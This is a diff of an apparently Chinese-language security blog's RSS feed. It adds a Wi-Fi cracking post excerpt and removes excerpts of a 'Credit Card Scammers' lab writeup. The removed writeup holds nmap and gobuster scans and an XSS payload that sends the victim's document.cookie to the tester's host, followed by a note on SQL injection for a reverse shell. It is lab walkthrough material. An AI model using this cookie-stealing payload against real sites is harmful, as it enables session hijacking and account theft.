@@ -1,4 +1,23 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Hack on Welcome My Hack's Blog</title><link>https://enilmalus.github.io/tags/hack/</link><description>Recent content in Hack on Welcome My Hack's Blog</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Mon, 05 Jan 2026 12:00:00 +0800</lastBuildDate><atom:link href="https://enilmalus.github.io/tags/hack/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux 提权专区</title><link>https://enilmalus.github.io/posts/linux-%E6%8F%90%E6%9D%83%E4%B8%93%E5%8C%BA/</link><pubDate>Mon, 05 Jan 2026 12:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/linux-%E6%8F%90%E6%9D%83%E4%B8%93%E5%8C%BA/</guid><description>&lt;h2 id="linux-提权简介"&gt;Linux 提权简介&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Hack on Welcome My Hack's Blog</title><link>https://enilmalus.github.io/tags/hack/</link><description>Recent content in Hack on Welcome My Hack's Blog</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Fri, 09 Jan 2026 21:30:00 +0800</lastBuildDate><atom:link href="https://enilmalus.github.io/tags/hack/index.xml" rel="self" type="application/rss+xml"/><item><title>WIFI 破解技术</title><link>https://enilmalus.github.io/posts/wifi%E7%A0%B4%E8%A7%A3%E6%8A%80%E6%9C%AF/</link><pubDate>Fri, 09 Jan 2026 21:30:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/wifi%E7%A0%B4%E8%A7%A3%E6%8A%80%E6%9C%AF/</guid><description>&lt;h2 id="所需环境"&gt;所需环境&lt;/h2&gt;
+&lt;p&gt;需要安装 Kali Linux 同时配备一张无线网卡。&lt;/p&gt;
+&lt;h2 id="操作过程"&gt;操作过程&lt;/h2&gt;
+&lt;h3 id="启动监控状态"&gt;启动监控状态&lt;/h3&gt;
+&lt;p&gt;先确认 kali 连接上了网卡，wlan0 是网卡信息。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ ip a
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu &lt;span style="color:#ae81ff"&gt;65536&lt;/span&gt; qdisc noqueue state UNKNOWN group default qlen &lt;span style="color:#ae81ff"&gt;1000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; inet 127.0.0.1/8 scope host lo
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; valid_lft forever preferred_lft forever
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; inet6 ::1/128 scope host noprefixroute 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; valid_lft forever preferred_lft forever
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;2: eth0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu &lt;span style="color:#ae81ff"&gt;1500&lt;/span&gt; qdisc fq_codel state UP group default qlen &lt;span style="color:#ae81ff"&gt;1000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; link/ether 00:0c:29:88:e4:07 brd ff:ff:ff:ff:ff:ff
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; inet6 fe80::2167:25b3:e756:16ad/64 scope link noprefixroute 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; valid_lft forever preferred_lft forever
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;10: wlan0: &amp;lt;BROADCAST,MULTICAST&amp;gt; mtu &lt;span style="color:#ae81ff"&gt;1500&lt;/span&gt; qdisc noop state DOWN group default qlen &lt;span style="color:#ae81ff"&gt;1000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; link/ether 7c:dd:90:30:23:19 brd ff:ff:ff:ff:ff:ff
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将网卡设置为监控状态。&lt;/p&gt;</description></item><item><title>Linux 提权专区</title><link>https://enilmalus.github.io/posts/linux-%E6%8F%90%E6%9D%83%E4%B8%93%E5%8C%BA/</link><pubDate>Mon, 05 Jan 2026 12:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/linux-%E6%8F%90%E6%9D%83%E4%B8%93%E5%8C%BA/</guid><description>&lt;h2 id="linux-提权简介"&gt;Linux 提权简介&lt;/h2&gt;
 &lt;p&gt;提权，即权限提升，源自英语词汇 Privilege Escalation，也可以缩写为 PrivEsca 或 PE。具体提权方法取决于目标系统的配置。我们可以通过分析诸如内核版本、已安装的应用程序、支持的编程语言和其他用户的凭据等关键元素，找到获取 root 权限的方法。这些关键元素通常包括操作系统或应用程序的错误配置、漏洞、超特权用户或弱凭据。&lt;/p&gt;
 &lt;h2 id="提权原理"&gt;提权原理&lt;/h2&gt;
 &lt;h3 id="常用权限体系"&gt;常用权限体系&lt;/h3&gt;
@@ -409,38 +428,7 @@
 &lt;p&gt;使用该字符串尝试进行 ftp 登入，因为没有密码，使用账号密码都使用 hostinger&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ftp 10.10.10.6
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P11.png" alt="P11"&gt;&lt;/p&gt;
-&lt;p&gt;binary 进入 二进制 模式&lt;/p&gt;</description></item><item><title>Credit Card Scammers Writeup</title><link>https://enilmalus.github.io/posts/credit-card-scammers-writeup/</link><pubDate>Sun, 18 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/credit-card-scammers-writeup/</guid><description>&lt;blockquote&gt;
-&lt;p&gt;此文章以 kali 地址为 10.10.10.5 为示例&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h1 id="credit-card-scammers-靶场"&gt;Credit Card Scammers 靶场&lt;/h1&gt;
-&lt;h2 id="服务扫描"&gt;服务扫描&lt;/h2&gt;
-&lt;p&gt;扫描所执行的命令，执行结果如下&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sn 10.10.10.0/24
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --min-rate &lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt; -p- 10.10.10.31 
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31 
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --script&lt;span style="color:#f92672"&gt;=&lt;/span&gt;vuln -p22,80,443,9090 10.10.10.31 
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/aaa.png" alt="aaa.png"&gt;&lt;/p&gt;
-&lt;h2 id="gobuster-爆破目录"&gt;gobuster 爆破目录&lt;/h2&gt;
-&lt;p&gt;在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/bbb.png" alt="bbb.png"&gt;&lt;/p&gt;
-&lt;h2 id="web-渗透"&gt;Web 渗透&lt;/h2&gt;
-&lt;p&gt;审计爆破的目录发现在 admin 下有一个登入界面&lt;/p&gt;
-&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/ccc.png" alt="ccc.png"&gt;&lt;/p&gt;
-&lt;p&gt;默认界面能找到提交表单&lt;/p&gt;
-&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/ddd.png" alt="ddd.png"&gt;&lt;/p&gt;
-&lt;p&gt;尝试 XSS&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;script&amp;gt;new Image().src=&amp;#34;http://10.10.10.5/?c=&amp;#34;+document.cookie;&amp;lt;/script&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="ee.png" alt="ee.png"&gt;&lt;/p&gt;
-&lt;p&gt;kali 架设连接&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;python3 -m http.server &lt;span style="color:#ae81ff"&gt;80&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/fff.png" alt="fff.png"&gt;&lt;/p&gt;
-&lt;p&gt;修改 cookie 登入&lt;/p&gt;
-&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/ggg.png" alt="ggg.png"&gt;&lt;/p&gt;
-&lt;p&gt;注入 sql 反弹 shell&lt;/p&gt;</description></item><item><title>Momentum2 Writeup</title><link>https://enilmalus.github.io/posts/momentum2-writeup/</link><pubDate>Fri, 16 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/momentum2-writeup/</guid><description>&lt;h1 id="服务扫描"&gt;服务扫描&lt;/h1&gt;
+&lt;p&gt;binary 进入 二进制 模式&lt;/p&gt;</description></item><item><title>Momentum2 Writeup</title><link>https://enilmalus.github.io/posts/momentum2-writeup/</link><pubDate>Fri, 16 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/momentum2-writeup/</guid><description>&lt;h1 id="服务扫描"&gt;服务扫描&lt;/h1&gt;
 &lt;h2 id="使用-nmap-进行基础扫描"&gt;使用 nmap 进行基础扫描&lt;/h2&gt;
 &lt;p&gt;扫描所执行的命令，执行结果如下&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sn 10.10.10.0/24
